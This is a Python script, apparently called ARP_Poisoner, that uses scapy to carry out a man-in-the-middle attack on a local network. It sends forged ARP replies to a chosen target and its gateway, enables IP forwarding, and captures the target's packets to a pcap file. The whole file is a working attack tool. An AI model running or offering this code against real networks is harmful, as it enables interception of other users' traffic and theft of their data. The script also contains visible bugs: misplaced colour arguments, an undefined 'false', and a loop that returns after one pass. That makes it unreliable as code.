from scapy.all import *
import os
import sys
import threading
import signal
from termcolor import colored

def usage():
    print("Usage: sudo python ARP_Poisoner.py [interface] [target] [router]")
    print("Interface en0 is Macbook Wifi")

def setIPForwarding(toggle):
    if (toggle == True):
        print(colored("[*] Turing on IP forwarding..."), ' yellow')
        # for OSX
        os.system('sysctl -w net.inet.ip.forwarding=1')

    # other
    # os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    if (toggle == False):
        print(colored("[*] Turing off IP forwarding..."), 'yellow')
        # for OSX
        os.system('sysctl -w net.inet.ip.forwarding=0')

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print(colored("[*] Restoring target...", 'yellow'))
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc= gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    #segnala al thread principale di uscire
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    responses, unanswered = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
        timeout=2,
        retry=10)
    # restituisce il MAC address dalla risposta
    for s, r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac
    print("[*] Beginning the ARP poison. [CTRL-C to stop]")
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            setIPForwarding(false)
            print(colored("[*] ARP poison attack finished."), 'yellow')
        return

def main():
    if len(sys.argv[1:]) != 3:
        usage()
        sys.exit(0)
    setIPForwarding(True)
    interface = sys.argv[1]
    target_ip = sys.argv[2]
    gateway_ip = sys.argv[3]
    packet_count = 1000

    # imposta la nostra interfaccia
    conf.iface = interface

    # disabilita l'output
    conf.verb = 0
    print("[*] Setting up %s" % interface)

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print(colored("[!!!] Failed to get gateway MAC. Exiting."), 'red')
        setIPForwarding(False)
        sys.exit(0)
    else:
        print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))
        target_mac = get_mac(target_ip)

    if target_mac is None:
        print(colored("[!!!] Failed to get target MAC. Exiting."), 'red')
        setIPForwarding(False)
        sys.exit(0)
    else:
        print("[*] Target %s is at %s" % (target_ip, target_mac))

    # Avvia il poison thread
    poison_thread = threading.Thread(
        target=poison_target,
        args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print(colored("[*] Starting sniffer for %d packets" % packet_count), 'green')

        bpf_filter = "ip host %s" % target_ip
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

        # scrive i pacchetti catturati
        wrpcap('arper.pcap', packets)

        # ripristina la rete
    # restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        setIPForwarding(False)
        sys.exit(0)

main()